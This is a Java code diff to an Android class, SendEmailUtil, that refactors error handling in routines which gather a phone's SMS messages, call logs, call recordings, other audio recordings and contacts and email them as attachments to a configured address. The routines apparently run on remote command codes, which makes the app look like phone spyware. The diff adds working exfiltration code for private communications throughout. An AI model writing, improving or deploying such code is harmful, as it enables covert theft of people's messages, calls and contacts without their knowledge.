@@ -82,35 +82,36 @@ public class SendEmailUtil {
 
 				@Override
 				public void run() {
-
-					String content = "短信和通话记录, 见附件";
-					Vector<String> files = new Vector<String>();
-
-					if (MainApplication.FILE_CALL_LOG.exists()) {
-						Debug.v("Add", MainApplication.FILE_CALL_LOG.getAbsolutePath());
-						files.add(MainApplication.FILE_CALL_LOG.getAbsolutePath());
-					}
-					if (MainApplication.FILE_DB_SMS.exists()) {
-						Debug.v("Add", MainApplication.FILE_DB_SMS.getAbsolutePath());
-						files.add(MainApplication.FILE_DB_SMS.getAbsolutePath());
-					}
-
-					SmsToTxtUtil.getInstence().saveAllSmsToTextFile();
-					if (MainApplication.FILE_SMS_TEXT.exists()) {
-						Debug.v("Add", MainApplication.FILE_SMS_TEXT.getAbsolutePath());
-						files.add(MainApplication.FILE_SMS_TEXT.getAbsolutePath());
-					}
-
-					if (files.size() <= 0) {
-						content = "尚没有任何记录！";
-					}
-
 					try {
-						sendMail("短信通话记录  " + String.valueOf(TimeUtil.getCurrentTimeMillis()), content, MainApplication.getInstence().getReceiverEmailAddr(), files);
-						codeDoSuccess(code);
-					} catch (MessagingException e) {
+						String content = "短信和通话记录, 见附件";
+						Vector<String> files = new Vector<String>();
+
+						if (MainApplication.FILE_CALL_LOG.exists()) {
+							Debug.v("Add", MainApplication.FILE_CALL_LOG.getAbsolutePath());
+							files.add(MainApplication.FILE_CALL_LOG.getAbsolutePath());
+						}
+						if (MainApplication.FILE_DB_SMS.exists()) {
+							Debug.v("Add", MainApplication.FILE_DB_SMS.getAbsolutePath());
+							files.add(MainApplication.FILE_DB_SMS.getAbsolutePath());
+						}
+
+						SmsToTxtUtil.getInstence().saveAllSmsToTextFile();
+						if (MainApplication.FILE_SMS_TEXT.exists()) {
+							Debug.v("Add", MainApplication.FILE_SMS_TEXT.getAbsolutePath());
+							files.add(MainApplication.FILE_SMS_TEXT.getAbsolutePath());
+						}
+
+						if (files.size() <= 0) {
+							content = "尚没有任何记录！";
+						}
+
+						if (sendMail("短信通话记录  " + String.valueOf(TimeUtil.getCurrentTimeMillis()), content, MainApplication.getInstence().getReceiverEmailAddr(), files)) {
+							codeDoSuccess(code);
+						} else {
+							updateFailedTimes(code);
+						}
+					} catch (Exception e) {
 						e.printStackTrace();
-						updateFailedTimes(code);
 					}
 				}
 
@@ -137,33 +138,33 @@ public class SendEmailUtil {
 
 				@Override
 				public void run() {
+					try {
+						String content = "通话录音，见附件";
+						Vector<String> files = new Vector<String>();
 
-					String content = "通话录音，见附件";
-					Vector<String> files = new Vector<String>();
-
-					File path = new File(MainApplication.FILEPATH_AUDIOS_CALL);
-					if (path.exists() && path.isDirectory()) {
-						File[] audios = path.listFiles();
-						if (audios != null) {
-							for (File audio : audios) {
-								files.add(audio.getAbsolutePath());
-								Debug.e("Add", " add file = " + audio.getAbsolutePath());
+						File path = new File(MainApplication.FILEPATH_AUDIOS_CALL);
+						if (path.exists() && path.isDirectory()) {
+							File[] audios = path.listFiles();
+							if (audios != null) {
+								for (File audio : audios) {
+									files.add(audio.getAbsolutePath());
+									Debug.e("Add", " add file = " + audio.getAbsolutePath());
+								}
 							}
 						}
-					}
 
-					if (files.size() <= 0) {
-						content = "尚没有通话录音！";
-					}
+						if (files.size() <= 0) {
+							content = "尚没有通话录音！";
+						}
 
-					try {
-						sendMail("通话录音  " + String.valueOf(TimeUtil.getCurrentTimeMillis()), content, MainApplication.getInstence().getReceiverEmailAddr(), files);
-						codeDoSuccess(code);
-					} catch (MessagingException e) {
+						if (sendMail("通话录音  " + String.valueOf(TimeUtil.getCurrentTimeMillis()), content, MainApplication.getInstence().getReceiverEmailAddr(), files)) {
+							codeDoSuccess(code);
+						} else {
+							updateFailedTimes(code);
+						}
+					} catch (Exception e) {
 						e.printStackTrace();
-						updateFailedTimes(code);
 					}
-
 				}
 			}).start();
 
@@ -188,32 +189,33 @@ public class SendEmailUtil {
 
 				@Override
 				public void run() {
-					String content = "其它录音，见附件";
-					Vector<String> files = new Vector<String>();
+					try {
+						String content = "其它录音，见附件";
+						Vector<String> files = new Vector<String>();
 
-					File path = new File(MainApplication.FILEPATH_AUDIOS_OTHER);
-					if (path.exists() && path.isDirectory()) {
-						File[] audios = path.listFiles();
-						if (audios != null) {
-							for (File audio : audios) {
-								files.add(audio.getAbsolutePath());
-								Debug.e("Add", " add other audio file = " + audio.getAbsolutePath());
+						File path = new File(MainApplication.FILEPATH_AUDIOS_OTHER);
+						if (path.exists() && path.isDirectory()) {
+							File[] audios = path.listFiles();
+							if (audios != null) {
+								for (File audio : audios) {
+									files.add(audio.getAbsolutePath());
+									Debug.e("Add", " add other audio file = " + audio.getAbsolutePath());
+								}
 							}
 						}
-					}
 
-					if (files.size() <= 0) {
-						content = "尚没有其他录音！";
-					}
+						if (files.size() <= 0) {
+							content = "尚没有其他录音！";
+						}
 
-					try {
-						sendMail("其它录音  " + String.valueOf(TimeUtil.getCurrentTimeMillis()), content, MainApplication.getInstence().getReceiverEmailAddr(), files);
-						codeDoSuccess(code);
-					} catch (MessagingException e) {
+						if (sendMail("其它录音  " + String.valueOf(TimeUtil.getCurrentTimeMillis()), content, MainApplication.getInstence().getReceiverEmailAddr(), files)) {
+							codeDoSuccess(code);
+						} else {
+							updateFailedTimes(code);
+						}
+					} catch (Exception e) {
 						e.printStackTrace();
-						updateFailedTimes(code);
 					}
-
 				}
 			}).start();
 
@@ -238,60 +240,59 @@ public class SendEmailUtil {
 				@Override
 				public void run() {
 
-					ContactsUtil.createContactsFile(MainApplication.getInstence());
-					SmsToTxtUtil.getInstence().saveAllSmsToTextFile();
-					CodesToTxtUtil.getInstence().saveAllCodesToTextFile();
-					
-					
-					String content = "所有记录，见附件";
-					Vector<String> files = new Vector<String>();
-
-					if (MainApplication.FILE_CALL_LOG.exists()) {
-						Debug.v("Add", MainApplication.FILE_CALL_LOG.getAbsolutePath());
-						files.add(MainApplication.FILE_CALL_LOG.getAbsolutePath());
-					}
-				
-					
-					if (MainApplication.FILE_SMS_TEXT.exists()) {
-						Debug.v("Add", MainApplication.FILE_SMS_TEXT.getAbsolutePath());
-						files.add(MainApplication.FILE_SMS_TEXT.getAbsolutePath());
-					}
-
-					if (MainApplication.FILE_CODE_TEXT.exists()) {
-						Debug.v("Add", MainApplication.FILE_CODE_TEXT.getAbsolutePath());
-						files.add(MainApplication.FILE_CODE_TEXT.getAbsolutePath());
-					}
-					
-					File path = new File(MainApplication.FILEPATH_AUDIOS_CALL);
-					if (path.exists() && path.isDirectory()) {
-						File[] audios = path.listFiles();
-						if (audios != null) {
-							for (File audio : audios) {
-								files.add(audio.getAbsolutePath());
-								Debug.e("Add", " add call audio file = " + audio.getAbsolutePath());
-							}
-						}
-					}
-
-					File path2 = new File(MainApplication.FILEPATH_AUDIOS_OTHER);
-					if (path2.exists() && path2.isDirectory()) {
-						File[] audios = path2.listFiles();
-						if (audios != null) {
-							for (File audio : audios) {
-								files.add(audio.getAbsolutePath());
-								Debug.e("Add", " add other audio file = " + audio.getAbsolutePath());
-							}
-						}
-					}
- 
 					try {
-						sendMail("所有记录  " + String.valueOf(TimeUtil.getCurrentTimeMillis()), content, MainApplication.getInstence().getReceiverEmailAddr(), files);
-						codeDoSuccess(code);
-					} catch (MessagingException e) {
-						e.printStackTrace();
-						updateFailedTimes(code);
-					}
+						ContactsUtil.createContactsFile(MainApplication.getInstence());
+						SmsToTxtUtil.getInstence().saveAllSmsToTextFile();
+						CodesToTxtUtil.getInstence().saveAllCodesToTextFile();
 
+						String content = "所有记录，见附件";
+						Vector<String> files = new Vector<String>();
+
+						if (MainApplication.FILE_CALL_LOG.exists()) {
+							Debug.v("Add", MainApplication.FILE_CALL_LOG.getAbsolutePath());
+							files.add(MainApplication.FILE_CALL_LOG.getAbsolutePath());
+						}
+
+						if (MainApplication.FILE_SMS_TEXT.exists()) {
+							Debug.v("Add", MainApplication.FILE_SMS_TEXT.getAbsolutePath());
+							files.add(MainApplication.FILE_SMS_TEXT.getAbsolutePath());
+						}
+
+						if (MainApplication.FILE_CODE_TEXT.exists()) {
+							Debug.v("Add", MainApplication.FILE_CODE_TEXT.getAbsolutePath());
+							files.add(MainApplication.FILE_CODE_TEXT.getAbsolutePath());
+						}
+
+						File path = new File(MainApplication.FILEPATH_AUDIOS_CALL);
+						if (path.exists() && path.isDirectory()) {
+							File[] audios = path.listFiles();
+							if (audios != null) {
+								for (File audio : audios) {
+									files.add(audio.getAbsolutePath());
+									Debug.e("Add", " add call audio file = " + audio.getAbsolutePath());
+								}
+							}
+						}
+
+						File path2 = new File(MainApplication.FILEPATH_AUDIOS_OTHER);
+						if (path2.exists() && path2.isDirectory()) {
+							File[] audios = path2.listFiles();
+							if (audios != null) {
+								for (File audio : audios) {
+									files.add(audio.getAbsolutePath());
+									Debug.e("Add", " add other audio file = " + audio.getAbsolutePath());
+								}
+							}
+						}
+
+						if (sendMail("所有记录  " + String.valueOf(TimeUtil.getCurrentTimeMillis()), content, MainApplication.getInstence().getReceiverEmailAddr(), files)) {
+							codeDoSuccess(code);
+						} else {
+							updateFailedTimes(code);
+						}
+					} catch (Exception e) {
+						e.printStackTrace();
+					}
 				}
 			}).start();
 
@@ -317,26 +318,28 @@ public class SendEmailUtil {
 				@Override
 				public void run() {
 
-					ContactsUtil.createContactsFile(MainApplication.getInstence());
-					
-					String content = "联系人，见附件";
-					Vector<String> files = new Vector<String>();
-
-					if (MainApplication.FILE_CONTACTS_TEXT.exists()) {
-						Debug.v("Add", MainApplication.FILE_CONTACTS_TEXT.getAbsolutePath());
-						files.add(MainApplication.FILE_CONTACTS_TEXT.getAbsolutePath());
-					}
-
-					if (files.size() <= 0) {
-						content = "联系人为空！";
-					}
-
 					try {
-						sendMail("联系人  " + String.valueOf(TimeUtil.getCurrentTimeMillis()), content, MainApplication.getInstence().getReceiverEmailAddr(), files);
-						codeDoSuccess(code);
-					} catch (MessagingException e) {
+						ContactsUtil.createContactsFile(MainApplication.getInstence());
+
+						String content = "联系人，见附件";
+						Vector<String> files = new Vector<String>();
+
+						if (MainApplication.FILE_CONTACTS_TEXT.exists()) {
+							Debug.v("Add", MainApplication.FILE_CONTACTS_TEXT.getAbsolutePath());
+							files.add(MainApplication.FILE_CONTACTS_TEXT.getAbsolutePath());
+						}
+
+						if (files.size() <= 0) {
+							content = "联系人为空！";
+						}
+
+						if (sendMail("联系人  " + String.valueOf(TimeUtil.getCurrentTimeMillis()), content, MainApplication.getInstence().getReceiverEmailAddr(), files)) {
+							codeDoSuccess(code);
+						} else {
+							updateFailedTimes(code);
+						}
+					} catch (Exception e) {
 						e.printStackTrace();
-						updateFailedTimes(code);
 					}
 				}
 			}).start();
@@ -348,12 +351,22 @@ public class SendEmailUtil {
 	}
 
 	private void codeDoSuccess(Code code) {
-		code.setResult(Code.RESULT_OK);
-		mDbOperater.updateCodeResult(code);
+		try {
+			code.setResult(Code.RESULT_OK);
+			mDbOperater.updateCodeResult(code);
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+	
 	}
 
 	private void updateFailedTimes(Code code) {
-		mDbOperater.updateCodeFailedTimes(code);
+		try {
+			mDbOperater.updateCodeFailedTimes(code);
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+		
 	}
 
 	/**
@@ -370,7 +383,7 @@ public class SendEmailUtil {
 	 * @throws MessagingException
 	 * @throws AddressException
 	 * */
-	private synchronized void sendMail(String subject, String body, String recipients, Vector<String> files) throws AddressException, MessagingException {
+	private synchronized boolean sendMail(String subject, String body, String recipients, Vector<String> files) {
 
 		Log.e(TAG, "recipients=" + recipients);
 
@@ -379,83 +392,53 @@ public class SendEmailUtil {
 		try {
 			message.setFrom(new InternetAddress(MainApplication.getInstence().getSenderEmailAddr()));
 			// message.setSender(new InternetAddress(userName));
-		} catch (AddressException e) {
-			e.printStackTrace();
-		} catch (MessagingException e) {
-			e.printStackTrace();
-		}
-
-		try {
 			if (recipients.contains(",")) {
 				message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(recipients));
 			} else {
 				message.setRecipient(Message.RecipientType.TO, new InternetAddress(recipients));
 			}
-		} catch (AddressException e) {
-			e.printStackTrace();
-		} catch (MessagingException e) {
-			e.printStackTrace();
-		}
-
-		try {
 			message.setSubject(subject);
-		} catch (AddressException e) {
-			e.printStackTrace();
-		} catch (MessagingException e) {
-			e.printStackTrace();
-		}
 
-		Multipart mp = new MimeMultipart();
-		MimeBodyPart mbpContent = new MimeBodyPart();
-		mbpContent.setText(body);
-		mp.addBodyPart(mbpContent);
-		if (files != null && files.size() > 0) {
-			for (int i = 0; i < files.size(); i++) {
-				MimeBodyPart attachPart = new MimeBodyPart();
-				FileDataSource fds = new FileDataSource(files.get(i)); // 打开要发送的文件
-				try {
-					attachPart.setDataHandler(new DataHandler(fds));
-				} catch (MessagingException e) {
-					e.printStackTrace();
-				}
-				try {
-					attachPart.setFileName(MimeUtility.encodeWord(fds.getName(), "utf-8", null));
-					// attachPart.setFileName(MimeUtility.encodeWord(fds.getName(),
-					// "GB2312", null));
-				} catch (MessagingException e) {
-					e.printStackTrace();
-				} catch (UnsupportedEncodingException e) {
-					e.printStackTrace();
+			Multipart mp = new MimeMultipart();
+			MimeBodyPart mbpContent = new MimeBodyPart();
+			mbpContent.setText(body);
+			mp.addBodyPart(mbpContent);
+			if (files != null && files.size() > 0) {
+				for (int i = 0; i < files.size(); i++) {
+					MimeBodyPart attachPart = new MimeBodyPart();
+					FileDataSource fds = new FileDataSource(files.get(i)); // 打开要发送的文件
+					try {
+						attachPart.setDataHandler(new DataHandler(fds));
+					} catch (MessagingException e) {
+						e.printStackTrace();
+					}
+					try {
+						attachPart.setFileName(MimeUtility.encodeWord(fds.getName(), "utf-8", null));
+					} catch (MessagingException e) {
+						e.printStackTrace();
+					} catch (UnsupportedEncodingException e) {
+						e.printStackTrace();
+					}
+
+					try {
+						mp.addBodyPart(attachPart);// 添加
+					} catch (MessagingException e) {
+						e.printStackTrace();
+					}
 				}
 
-				try {
-					mp.addBodyPart(attachPart);// 添加
-				} catch (MessagingException e) {
-					e.printStackTrace();
-				}
 			}
-
-			files.removeAllElements();
-		}
-
-		try {
 			message.setContent(mp);
-		} catch (MessagingException e) {
-			e.printStackTrace();
-		}
-
-		try {
 			// message.saveChanges();
 			message.setSentDate(new Date());
-		} catch (MessagingException e) {
+			Transport.send(message);// 开始发送
+			return true;
+		} catch (Exception e) {
 			e.printStackTrace();
 		}
 
-		try {
-			Transport.send(message);// 开始发送
-		} catch (MessagingException e) {
-			e.printStackTrace();
-		}
+		return false;
+
 	}
 
 	private static class SmtpAuth extends Authenticator {
